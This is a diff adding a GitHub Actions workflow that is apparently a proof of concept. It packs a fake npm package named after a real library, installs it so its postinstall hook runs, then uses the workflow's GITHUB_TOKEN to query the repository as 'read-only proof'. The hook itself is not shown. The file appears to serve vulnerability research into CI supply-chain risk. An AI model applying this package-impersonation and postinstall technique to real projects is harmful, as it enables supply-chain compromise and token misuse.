@@ -1,0 +1,48 @@
+name: PoC - postinstall via artifact
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  build-library:
+    runs-on: ubuntu-latest
+    outputs:
+      run_id: ${{ github.run_id }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Pack fake package
+        working-directory: fake-package
+        run: |
+          npm pack
+          mv shopify-react-native-skia-1.0.0.tgz package.tgz
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: package-tgz
+          path: fake-package/package.tgz
+
+  install-and-trigger:
+    needs: build-library
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Download artifact
+        uses: actions/download-artifact@v4
+        with:
+          name: package-tgz
+          path: /tmp
+
+      - name: Install package (triggers postinstall)
+        working-directory: test-app
+        run: |
+          npm install /tmp/package.tgz
+
+      - name: Show GITHUB_TOKEN scope (read-only proof)
+        run: |
+          curl -s -H "Authorization: Bearer ${{ github.token }}" \
+            https://api.github.com/repos/${{ github.repository }} \
+            | python3 -c "import sys,json; d=json.load(sys.stdin); print('Repo:', d.get('full_name')); print('Private:', d.get('private'))"
